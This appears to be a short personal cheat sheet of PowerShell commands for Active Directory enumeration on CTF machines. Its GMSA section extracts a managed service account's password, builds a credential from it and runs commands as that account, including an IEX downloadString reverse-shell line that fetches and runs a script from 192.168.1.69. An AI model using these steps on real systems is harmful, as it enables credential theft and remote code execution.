# active directory

## get user account
```powershell
Get-AdUser AccountUsername
```

## get GMSA service account properties
```powershell
Get-AdServiceAccount AccountUsername -properties *
```

### get GMSA password and run commands
```powershell
# get password
$gmsa = Get-AdServiceAccount AccountUsername -properties msDS-ManagedPassword
$mp = $gmsa.'msDS-ManagedPassword'
# get secure string
$secpwd = (ConvertFrom-AdManagedPasswordBlob $mp).SecureCurrentPassword
$cred = New-Object System.Management.Automation.PSCredential('AccountUsername', $secpwd)
# test command
Invoke-Command -Computer 127.0.0.1 -Credential $cred -ScriptBlock { whoami }
# rev shell
Invoke-Command -Computer 127.0.0.1 -Credential $cred -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://192.168.1.69/rev.ps1') }
```

#### fix missing ConvertFrom-AdManagedPasswordBlob
ConvertFrom-AdManagedPasswordBlob is not recognized as the name of a cmdlet, function...
need to install DSInternals module
```powershell
Install-Module DSInternals -Force
```
if powershell gallery is not available on CTF boxes
##### TODO: add steps to install from zip

# general enumeration

## get list of filepaths recursively
```powershell
gci -recurse . | select fullname
```

## get processes
```powershell
Get-Process
```
